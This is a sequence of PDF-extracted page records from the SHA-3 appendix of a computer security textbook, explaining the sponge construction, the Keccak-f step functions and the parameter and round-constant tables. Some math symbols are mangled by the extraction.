       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 962, 'page_label': 'J-5'}, page_content='J.3 / THE SPONGE CONSTRUCTION  J-5\\nThe sponge function is defined by three parameters:\\n1. f is the internal function used to pr\\nocess each input block.2\\n2. r is the size in bits of the input blocks , called the bitrate.\\n3. pad is the padding algorithm.\\nA sponge function allows both v\\nariable length input and output, making it \\na flexible structure that can be used for a hash function (fixed length output), a \\n pseudorandom number generator (fixed length input), and other cryptographic func-\\ntions. \\nFigure J.1 illustrates this point. An input message of n bits is partitioned into \\nk fixed-size blocks of r  bits each. If necessary, the message is padded to achieve a \\nlength that is an integer multiple of r bits. The resulting partition is the sequence of \\nblocks P0, P1, c, Pk - 1, with n = k * r. For uniformity, padding is always added, so \\nthat if n mod r = 0, a padding block of r bits is added. The actual padding algorithm \\n2The KECCAK documentation refers to f as a permutation. As we shall see, it involves both permutations \\nand substitutions. We refer to f as the iteration function, because it is the function that is executed once \\nfor each iteration, that is, once for each block of the message that is processed.\\nFigure J.1 Sponge Function:  Input and Output\\nk    r bits\\n(a) Input\\n(b) Output\\nP 0 P 1\\nZ 0 Z 1\\nZ j–1\\nP k–1\\nmessage pad\\nr  bits r  bits r  bits\\nr  bits r  bits\\n r  bits\\nl  bits\\nn bits\\nZ13_STAL0611_04_GE_APPJ.indd   5 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 963, 'page_label': 'J-6'}, page_content='J-6  APPENDIX J / SHA-3\\nis a parameter of the function. The sponge specification proposes [BERT11] two \\npadding schemes:\\n• Simple padding: Denoted by pad 10*, appends a single bit 1 followed by the \\nminimum number of bits 0 such that the length of the r\\nesult is a multiple of the \\nblock length.\\n• Multirate padding: Denoted by pad 10*1, appends a single bit 1 followed by \\nthe minimum number of bits 0 followed by a single bit 1 such that the length of \\nthe r\\nesult is a multiple of the block length. This is the simplest padding scheme \\nthat allows secure use of the same f with different rates r.\\nAfter processing all of the blocks, the sponge function generates a sequence \\nof output blocks Z0, Z1, c, Zj - 1, The number of output blocks generated is deter-\\nmined by the number of output bits desired. If the desired output is / bits, then j \\nblocks are produced, such that (j - 1) * r 6 / … j * r.\\nFigure J.2 shows the iterated structure of the sponge function. The sponge \\nconstruction operates on a state variable s  of length b = r + c bits, which is initial-\\nized to all zeros and modified at each iteration. The value r  is called the bitrate. \\nThis value is the block size used to partition the input message. The term bitrate  \\nreflects the fact that r  is the number of bits processed at each iteration: the larger \\nthe value of r ,\\xa0the greater the rate at which message bits are processed by the \\nsponge construction. The\\xa0value c is referred to as the capacity. A discussion of the \\nsecurity implications of the capacity is beyond our scope. In essence, the capacity \\nis a measure of the achievable complexity of the sponge construction and therefore \\nthe achievable level of security. A given implementation can trade claimed security \\nfor speed by increasing the capacity c and decreasing the bitrate r  accordingly, or \\nvice-versa. The default values for KECCAK are c = 1024 bits, r = 576 bits, and \\ntherefore b = 1600 bits.\\nThe sponge construction consists of two phases. The absorbing phase proceeds \\nas follows: For each iteration, the input block to be processed is padded with zeroes to \\nextend its length from r bits to b bits. Then, the bitwise XOR of the extended message \\nblock and s is formed to create a b-bit input to the iteration function f. The output of \\nf is the value of s for the next iteration.\\nIf the desired output length / satisfies / … b, then at the completion of the \\nabsorbing phase, the first / bits of s are returned and the sponge construction termi-\\nnates. Otherwise, the sponge construction enters the squeezing phase. To begin, the \\nfirst r bits of s are retained as block Z0. Then, the value of s is updated with repeated \\nexecutions of f , and at each iteration, the first r bits of s  are retained as block Zi \\nand concatenated with previously generated blocks. The process continues through \\n(j - 1) iterations until we have (j - 1) * r 6 / … j * r. At this point, the first / bits \\nof output blocks Z0 , Z1 , … , Zj-1 are returned.\\nNote the absorbing phase has the structure of a typical hash function. A com-\\nmon case will be one in which the desired hash length is equal to the input block \\nlength; that is / = r. In that case, the sponge construction terminates after the \\nabsorbing phase. If a longer output than b bits is required, then the squeezing phase \\nis employed. Thus, the sponge construction is quite flexible. For example, a short \\nZ13_STAL0611_04_GE_APPJ.indd   6 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 964, 'page_label': 'J-7'}, page_content='J.3 / THE SPONGE CONSTRUCTION  J-7\\nFigure J.2 Sponge Construction\\nSource\\n: BERT11. Bertoni, G., et al. “Cryptographic Sponge Functions.” January 2011, \\npage 14, http://sponge.noekeon.org/CSF-0.1.pdf http://sponge.noekeon.org/. Guido \\n Bertoni sponge-at-noekeon-dot-org The Sponge Functions Corner\\n(a) Absorbing phase\\n(b) Squeezing phase\\nf\\nr c\\n0c\\n0c\\n0c\\n0r 0c\\nP 0\\nP 1\\nP 2\\nf\\ns\\nf\\ns\\nf\\ns\\n0cP k–1\\nb\\nr c\\nb\\nr c\\nZ0\\nr\\nZ1\\nmessage with a length r could be used as a seed and the sponge construction would \\nfunction as a pseudorandom number generator.\\nTo summarize, the sponge construction is a simple iterated construction for \\nbuilding a function F with variable-length input and arbitrary output length based \\non a fixed-length transformation or permutation f operating on a fixed number b of \\nbits. The sponge construction is defined formally in [BERT11] as follows:\\nZ13_STAL0611_04_GE_APPJ.indd   7 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 965, 'page_label': 'J-8'}, page_content='J-8  APPENDIX J / SHA-3\\nIn the algorithm definition, the following notation is used: /H20841M/H20841 is the length \\nin bits of a bit string M. A bit string M can be considered as a sequence of blocks of \\nsome fixed length x, where the last block may be shorter. The number of blocks of M \\nis denoted by /H20841M/H20841x. The blocks of M are denoted by Mi and the index ranges from \\n0 to /H20841M/H20841x - 1. The expression :M;/ denotes the truncation of M to its first / bits.\\nThe overall structure of SHA-3 is expressed as Keccak[r , c]. Table J.2 shows \\nthe supported values of r and c. SHA-3 makes use of the iteration function f, labeled \\n K\\neccak-f, which is described in the next section. The overall SHA-3 function is a \\nsponge function expressed as Keccak[ r, c] to reflect that SHA-3 has two opera -\\ntional parameters, r, the message block size, and c, the capacity, with the default of \\nr + c = 1600 bits. As Table J.2 indicates, the hash function security associated with the \\nsponge construction is a function of the capacity c.\\nAlgorithm T he sponge construction SPONGE[f, pad, r]\\nRequire: r 6 b\\nInterface: Z = sponge (M, /) with M /uni2208Z2\\n*, integer / 7 0 and Y /uni2208Z2\\n/\\n P = M/H20841 /H20841pad[r](/H20841M/H20841)\\n s = 0b\\nfor i = 0 to /H20841P/H20841r - 1 do\\n s = s /uni2295.alt(Pi /H20841 /H208410b - r)\\n s = f(s)\\nend for\\nZ = :s;r\\nwhile /H20841Z/H20841r r 6 / do\\n s = f(s)\\n Z = Z/H20841 /H20841:s;r\\nend while\\nreturn :Z;/\\nMessage digest size  224  256 384  512\\nMessage size No maximum No maximum No maximum No maximum\\nBlock size (bitrate r) 1152 1088 832  \\n576\\nWord size  \\n64  \\n64  \\n64  \\n64\\nNumber of rounds  \\n24  \\n24  \\n24  \\n24\\nCapacity c  \\n448  \\n512 768 1024\\nCollision resistance    2112    2128   2192    2256\\nSecond preimage resistance    2224    2256   2384    2512\\nNote: All sizes and security levels are measured in bits.\\nTable J.2  SHA-3 Parameters\\nZ13_STAL0611_04_GE_APPJ.indd   8 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 966, 'page_label': 'J-9'}, page_content='J.4 / THE SHA-3 ITERATION FUNCTION F  J-9\\nFigure J.3 SHA-3 State Matrix\\nL[0, 4]\\nx = 0 x = 1 x = 2 x = 3 x = 4\\nL[0, 3]\\nL[0, 2]\\nL[0, 1]\\nL[0, 0]\\na[x, y, 0] a[x, y, 1] a[x, y, 2]\\ny = 1\\ny = 0\\ny = 2\\ny = 3\\ny = 4 L[1, 4]\\nL[1, 3]\\nL[1, 2]\\nL[1, 1]\\nL[1, 0]\\nL[2, 4]\\nL[2, 3]\\nL[2, 2]\\nL[2, 1]\\nL[2, 0]\\n(a) State variable as 5    5 matrix A of 64-bit words\\n(b) Bit labeling of 64-bit words\\nL[3, 4]\\nL[3, 3]\\nL[3, 2]\\nL[4, 1]\\nL[3, 0]\\nL[4, 4]\\nL[4, 3]\\nL[4, 2]\\nL[4, 1]\\nL[4, 0]\\na[x, y, 63]a[x, y, 62]a[x, y, z]\\nIn terms of the sponge algorithm defined above, Keccak[r, c] is defined as\\nKeccak[r, c] /uni2206 SPONGE[Keccak-f [r + c], pad 10*1, r]\\nWe now turn to a discussion of the iteration function Keccak-f.\\n J.4 THE SHA-3 ITERATION FUNCTION F\\nWe now examine the iteration function Keccak-f  used to process each successive \\nblock of the input message. Recall that f takes as input a 1600-bit variable s consisting \\nof r bits, corresponding to the message block size followed by c  bits, referred to as \\nthe capacity. For internal processing within f, the input state variable s is organized \\nas a 5 * 5 * 64 array a. The 64-bit units are referred to as lanes. For our purposes, \\nwe generally use the notation a [x, y, z] to refer to an individual bit with the state \\narray. When we are more concerned with operations that affect entire lanes, we des-\\nignate the 5 * 5 matrix as L[x, y], where each entry in L is a 64-bit lane. The use of \\nindices within this matrix is shown in \\nFigure J.3.3  Thus, the columns are labeled x = 0 \\nthrough x = 4, the rows are labeled y = 0 through y = 4, and the individual bits \\nwithin a lane are labeled z = 0 through z = 63. The mapping between the bits of s \\nand those of a is\\ns[64(5y + x) + z] = a[x, y, z].\\nWe can visualize this with respect to the matrix in Figure J.3. When treating the \\nstate as a matrix of lanes, the first lane in the lower left corner, L[0, 0], corresponds to \\n3Note that the first index (x) designates a column, and the second index (y) designates a row. This is in \\nconflict with the convention used in most mathematics sources, where the first index designates a row \\nand the second index designates a column. (e.g., Knuth, D., The Art of Computer Programming, Volume 1, \\nFundamental Algorithms; and Korn, G., and Korn, T., Mathematical Handbook for Scientists and Engineers.)\\nZ13_STAL0611_04_GE_APPJ.indd   9 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 967, 'page_label': 'J-10'}, page_content='J-10  APPENDIX J / SHA-3\\nthe first 64 bits of s. The lane in the second column, lowest row, L[1, 0], corresponds \\nto the next 64 bits of s. Thus, the array a is filled with the bits of s starting with row \\ny = 0 and proceeding row by row.\\nStructure of f\\nThe function f is executed once for each input block of the message to be hashed. \\nThe function takes as input the 1600-bit state variable and converts it into a 5 * 5 \\nmatrix of 64-bit lanes. This matrix then passes through 24 rounds of processing. Each \\nround consists of five steps, and each step updates the state matrix by permutation \\nor substitution operations. As shown in \\nFigure J.4, the rounds are identical with the \\nexception of the final step in each round, which is modified by a round constant that \\ndiffers for each round.\\nThe application of the five steps can be expressed as the composition 4 of \\nfunctions:\\nR = ioxoporou\\n4If f and g  are two functions, then the function F  with the equation y = F(x) = g[f(x)] is called the \\n composition of \\nf and g and is denoted as F = g o f.\\nFigure J.4 SHA-3 Iteration Function f\\ntheta u step\\ns\\ns\\nrho r step\\npi π step\\nchi x step\\nRound 0\\niota i step RC[0]\\nrot(x, y)\\ntheta u step\\nrho r step\\npi π step\\nchi x step\\nRound 23\\niota i step RC[23]\\nrot(x, y)\\nZ13_STAL0611_04_GE_APPJ.indd   10 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 968, 'page_label': 'J-11'}, page_content='J.4 / THE SHA-3 ITERATION FUNCTION F  J-11\\nTable J.3 summarizes the operation of the five steps. The steps have a  simple \\ndescription leading to a specification that is compact and in which no trapdoor\\n \\ncan be hidden. The operations on lanes in the specification are limited to bitwise \\nBoolean operations (XOR, AND, NOT) and rotations. There is no need for table-  \\nlookups,\\n arithmetic operations, or data-dependent rotations. Thus, SHA-3 is easily \\nand  efficiently implemented in either har\\ndware or software.\\nWe examine each of the step functions in turn.\\nTheta Step Function\\nThe KECCAK reference defines the u function as follows. For bit z in column x, row y:\\nu: acx,y,z d d acx,y,z d /uni2295.alta\\n4\\ny/uni2032= 0\\nacax - 1b,y,z d /uni2295.alta\\n4\\ny/uni2032= 0\\nacax + 1b,y,az - 1b d (J.1)\\nwhere the summations are XOR operations. We can see more clearly what this opera-\\ntion accomplishes with reference to \\nFigure J.5a. First, define the bitwise XOR of the \\nlanes in column x as:\\nC[x] = L[x, 0] /uni2295.altL[x, 1] /uni2295.altL[x, 2] /uni2295.altL[x, 3] /uni2295.altL[x, 4]\\nConsider lane L[x, y] in column x, row y. The first summation in Equation (J.1) \\nperforms a bitwise XOR of the lanes in column (x - 1) mod 4 to form the 64-bit lane \\nC[x - 1]. The second summation performs a bitwise XOR of the lanes in column \\n(x + 1) mod 4, then rotates the bits within the 64-bit lane so the bit in position z is \\nmapped into position z + 1 mod 64. This forms the lane ROT(C[x + 1], 1). These \\ntwo lanes and L[x, y] are combined by bitwise XOR to form the updated value of \\nL[x, y]. This can be expressed as:\\nL[x, y] d L[x, y] /uni2295.altC[x - 1] /uni2295.altROT(C[x + 1], 1)\\nFigure J.5a illustrates the operation on L[3, 2]. The same operation is performed \\non all of the other lanes in the matrix.\\nFunction Type Description\\nu Substitution New value of each bit in each word depends its current \\nvalue and on one bit in each word of the preceding  column \\nand one bit of each word in the succeeding column.\\nr Permutation The bits of each word are permuted using a circular bit \\nshift. W[0, 0] is not affected.\\np Permutation Words are permuted in the 5 * 5 matrix. W[0, 0] is not \\naffected.\\nx Substitution New value of each bit in each word depends on its current \\nvalue and on one bit in the next word in the same row and \\none bit in the second next word in the same row.\\ni Substitution W[0, 0] is updated by XOR with a round constant.\\nTable J.3  Step Functions in SHA-3\\nZ13_STAL0611_04_GE_APPJ.indd   11 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 969, 'page_label': 'J-12'}, page_content='J-12  APPENDIX J / SHA-3\\nFigure\\n J.5\\n Theta and Chi Step F\\nunctions\\n(a) q step function\\nLt[2, 3]L[2, 3] ROT(C[3], 1)C[1]\\nL[0, 4]\\nx = 0 x = 1 x = 2 x = 3 x = 4\\nL[0, 3]\\nL[0, 2]\\nL[0, 1]\\nL[0, 0]\\ny = 1\\ny = 0\\ny = 2\\ny = 3\\ny = 4 L[1, 4]\\nL[1, 3]\\nL[1, 2]\\nL[1, 1]\\nL[1, 0]\\nL[2, 4]\\nL[2, 3]\\nL[2, 2]\\nL[2, 1]\\nL[2, 0]\\nL[3, 4]\\nL[3, 3]\\nL[3, 2]\\nL[4, 1]\\nL[3, 0]\\nL[4, 4]\\nL[4, 3]\\nL[4, 2]\\nL[4, 1]\\nL[4, 0]\\n(b) c step function\\nL[2, 3]L[2, 3] L[3, 3] AND L[4, 3]\\nL[0, 4]\\nx = 0 x = 1 x = 2 x = 3 x = 4\\nL[0, 3]\\nL[0, 2]\\nL[0, 1]\\nL[0, 0]\\ny = 1\\ny = 0\\ny = 2\\ny = 3\\ny = 4 L[1, 4]\\nL[1, 3]\\nL[1, 2]\\nL[1, 1]\\nL[1, 0]\\nL[2, 4]\\nL[2, 3]\\nL[2, 2]\\nL[2, 1]\\nL[2, 0]\\nL[3, 4]\\nL[3, 3]\\nL[3, 2]\\nL[4, 1]\\nL[3, 0]\\nL[4, 4]\\nL[4, 3]\\nL[4, 2]\\nL[4, 1]\\nL[4, 0]\\nSeveral observations are in order. Each bit in a lane is updated using the bit \\nitself, and one bit in the same bit position from each lane in the preceding column, \\nand one bit in the adjacent bit position from each lane in the succeeding column. Thus, \\nthe updated value of each bit depends on 11 bits. This provides good mixing. Also, \\nthe theta step provides good diffusion, which means that changing one bit position \\nin the\\xa0source affects the value of many of the hash bits. The designers of KECCAK \\nstate that the theta step provides a high level of diffusion on average and that without \\ntheta, the round function would not provide diffusion of any significance.\\nRho Step Function\\nThe r function is defined as follows:\\nr: acx,y,z d d acx,y,z d  if x = y = 0\\nZ13_STAL0611_04_GE_APPJ.indd   12 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 970, 'page_label': 'J-13'}, page_content='J.4 / THE SHA-3 ITERATION FUNCTION F  J-13\\notherwise,\\n r: a£x,y,z § d a£x,y,°z -\\nat + 1bat + 2b\\n2\\n¢§  (J.2)\\nwith t\\n satisfying 0 … t 6 24 and ¢0 1\\n2 3 ≤\\nt\\n¢1\\n0≤ = ¢x\\ny≤ in GF(5)2 * 2\\nIt is not immediately obvious what this step performs, so let us look at the \\nprocess in detail:\\n1. The lane in position (x, y) = (0, 0), that is L[0, 0], is unaffected. For all other \\nwords, a circular bit shift within the lane is performed.\\n2. The v\\nariable t, with 0 … t 6 24, is used to determine both the amount of the \\ncircular bit shift and which lane is assigned which shift value.\\n3. The 24 individual \\nbit shifts that are performed have the respective values \\nat + 1bat + 2b\\n2  mod 64.\\n4. The shift determined by the value of t  is performed on the lane in position  \\n(x, y) in the 5 * 5 matrix of lanes. Specifically, for each value of t, the corre-\\nsponding matrix position is defined by ¢x\\ny≤ = ¢0 1\\n2 3 ≤\\nt\\n¢1\\n0≤. For example, for \\nt = 3, we have:\\n ¢x\\ny≤ = ¢0 1\\n2 3 ≤\\n3\\n¢1\\n0≤ mod 5\\n = ¢0 1\\n2 3 ≤¢ 0 1\\n2 3≤¢ 0 1\\n2 3≤¢ 1\\n0≤ mod 5\\n = ¢0 1\\n2 3 ≤¢ 0 1\\n2 3≤¢ 0\\n2≤ mod 5\\n = ¢0 1\\n2 3 ≤¢ 2\\n6≤ mod 5 = ¢0 1\\n2 3 ≤¢ 2\\n1≤ mod 5\\n = ¢1\\n7≤ mod 5 = ¢1\\n2≤\\nTable J.4a shows the calculations that are performed to determine the amount \\nof the bit shift and the location of each bit shift value. Note all of the rotation amounts \\nare different. Table J.4b shows the rotation values for each lane in the matrix.\\nThe r function thus consists of a simple permutation (circular shift) within \\neach lane. The intent is to provide diffusion within each lane. Without this function, \\n diffusion between lanes would be very slow\\n.\\nZ13_STAL0611_04_GE_APPJ.indd   13 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 971, 'page_label': 'J-14'}, page_content='J-14  APPENDIX J / SHA-3\\nPi Step Function\\nThe p function is defined as follows:\\n p: a[x,y] d a[x/uni2032,y/uni2032], with¢x\\ny≤ = ¢0 1\\n2 3 ≤¢ x/uni2032\\ny/uni2032≤ (J.3)\\nThis can be r\\newritten as (x, y) * (y, (2x + 3y)). Thus, the lanes within the 5 * 5 \\nmatrix are moved so the new x position equals the old y position, and the new y posi-\\ntion is determined by (2x + 3y) mod 5. Figure J.6 helps in visualizing this permuta-\\ntion. Lanes that are along the same diagonal (increasing in y value going from left to \\nright) prior to p are arranged on the same row in the matrix after p is executed. Note \\nthe position of L[0, 0] is unchanged.\\n(a) Calculation of values and positions\\nT g(t) g(t) mod 64 x, y t g(t) g(t) mod 64 x, y\\n0 1 1 1, 0 12 91 27 4, 0\\n1 3 3 0, 2 13 105 41 0, 3\\n2 6 6 2, 1 14 120 56 3, 4\\n3 10 10 1, 2 15 136  8 4\\n, 3\\n4 15 15 2, 3 16 153 25 3, 2\\n5 21 21 3, 3 17 171 43 2, 2\\n6 28 28 3, 0 18 190 62 2, 0\\n7 36 36 0, 1 19 210 18 0, 4\\n8 45 45 1, 3 20 231 39 4, 2\\n9 55 55 3, 1 21 253 61 2, 4\\n10 66 2 1, 4 22 276 20 4, 1\\n11 78 14 4, 4 23 300 44 1, 1\\nNote: g(t) = (t + 1)(t + 2)/2\\n¢x\\ny≤ = ¢0 1\\n2 3 ≤\\nt\\n¢1\\n0≤ mod 5\\nTable J.4  Rotation Values Used in SHA-3\\n(b) Rotation values by lane position in matrix\\nx = 0 x = 1 x = 2 x = 3 x = 4\\ny = 4 18  2 61 56 14\\ny = 3 41 45 15 21  8\\ny = 2  3 10 43 25 39\\ny = 1 36 44  6 55 20\\ny = 0  0  1 62 28 27\\nZ13_STAL0611_04_GE_APPJ.indd   14 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 972, 'page_label': 'J-15'}, page_content='J.4 / THE SHA-3 ITERATION FUNCTION F  J-15\\nFigure J.6 Pi Step F unction\\nZ[0, 4]\\nx = 0 x = 1 x = 2\\n(a) Lane position at start of step\\n(b) Lane position after permutation\\nx = 3 x = 4\\nZ[0, 3]\\nZ[0, 2]\\nZ[0, 1]\\nZ[0, 0]\\ny = 1\\ny = 0\\ny = 2\\ny = 3\\ny = 4 Z[1, 4]\\nZ[1, 3]\\nZ[1, 2]\\nZ[1, 1]\\nZ[1, 0]\\nZ[2, 4]\\nZ[2, 3]\\nZ[2, 2]\\nZ[2, 1]\\nZ[2, 0]\\nZ[3, 4]\\nZ[3, 3]\\nZ[3, 2]\\nZ[3, 1]\\nZ[3, 0]\\nZ[4, 4]\\nrow 0row 3row 1row 4row 2\\nrow 2\\nrow 4\\nrow 1\\nrow 3\\nZ[4, 3]\\nZ[4, 2]\\nZ[4, 1]\\nZ[4, 0]\\nZ[2, 0]\\nx = 0 x = 1 x = 2 x = 3 x = 4\\nZ[4, 0]\\nZ[1, 0]\\nZ[3, 0]\\nZ[0, 0]\\ny = 1\\ny = 0\\ny = 2\\ny = 3\\ny = 4 Z[3, 1]\\nZ[0, 1]\\nZ[2, 1]\\nZ[4, 1]\\nZ[1, 1]\\nZ[4, 2]\\nZ[1, 2]\\nZ[3, 2]\\nZ[0, 2]\\nZ[2, 2]\\nZ[0, 3]\\nZ[2, 3]\\nZ[4, 3]\\nZ[1, 3]\\nZ[3, 3]\\nZ[1, 4]\\nZ[3, 4]\\nZ[0, 4]\\nZ[2, 4]\\nZ[4, 4]\\nThus, the p step is a permutation of lanes: the lanes move position within the \\n5 * 5 matrix. The r step is a permutation of bits: bits within a lane are rotated. Note \\nthe p step matrix positions are calculated in the same way that, for the r step, the \\none-dimensional sequence of rotation constants is mapped to the lanes of the matrix.\\nChi Step Function\\nThe x function is defined as follows:\\n x: acx d d acx d /uni2295.alt¢¢ a[x + 1] /uni2295.alt1≤AND acx + 2 d ≤ (J.4)\\nT\\nhis function operates to update each bit based on its current value and the \\nvalue of the corresponding bit position in the next two lanes in the same row. The \\noperation is more clearly seen if we consider a single bit a[x, y, z] and write out the \\nBoolean expression:\\na[x,y,z] d a[x,y,z] /uni2295.alt(NOT(a[x + 1,y,z]))AND(a[x + 2,y,z])\\nZ13_STAL0611_04_GE_APPJ.indd   15 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 973, 'page_label': 'J-16'}, page_content='J-16  APPENDIX J / SHA-3\\nRound\\nConstant \\n(hexadecimal)\\nNumber \\nof 1 bits Round\\nConstant \\n(hexadecimal)\\nNumber \\nof 1 bits\\n0 0000000000000001 1 12 000000008000808B 6\\n1 0000000000008082 3 13 800000000000008B 5\\n2 800000000000808A 5 14 8000000000008089 5\\n3 8000000080008000 3 15 8000000000008003 4\\n4 000000000000808B 5 16 8000000000008002 3\\n5 0000000080000001 2 17 8000000000000080 2\\n6 8000000080008081 5 18 000000000000800A 3\\n7 8000000000008009 4 19 800000008000000A 4\\n8 000000000000008A 3 20 8000000080008081 5\\n9 0000000000000088 2 21 8000000000008080 3\\n10 0000000080008009 4 22 0000000080000001 2\\n11 000000008000000A 3 23 8000000080008008 4\\nTable J.5   Round Constants in SHA-3\\nFigure J.5b illustrates the operation of the x function on the bits of the lane  \\nL[3, 2]. This is the only one of the step functions that is a nonlinear mapping. Without \\nit, the SHA-3 round function would be linear.\\nIota Step Function\\nThe i function is defined as follows:\\n i: a d a /uni2295.altRCcir d (J.5)\\nThis function combines each arra\\ny element with a round constant that differs \\nfor each round. It breaks up any symmetry induced by the other four routines. In fact, \\nEquation (J.5) is somewhat misleading. The round constant is applied only to the first \\nlane of the internal state array. We express this is as follows:\\nL[0, 0] d L[0, 0] /uni2295.altRC[ir] 0 … ir … 24\\nTable J.5 lists the 24 64-bit round constants. Note the Hamming weight, or num-\\nber of 1 bits, in the round constants ranges from 1 to 6. Most of the bit  positions are \\nzero and thus do not change the corr\\nesponding bits in L[0, 0]. If we take the cumula-\\ntive OR of all 24 round constants, we get\\nRC[0] OR RC[1] OR cOR RC[23] =  800000008000808B\\nThus, only 7 bit positions are active and can affect the value of L[0, 0]. Of course, \\nfrom round to round, the permutations and substitutions propagate the effects of the i \\nfunction to all of the lanes and all of the bit positions in the matrix. It is easily seen that \\nthe disruption diffuses through u and x to all lanes of the state after a single round.\\nZ13_STAL0611_04_GE_APPJ.indd   16 10/11/17   3:40 PM'),\n",
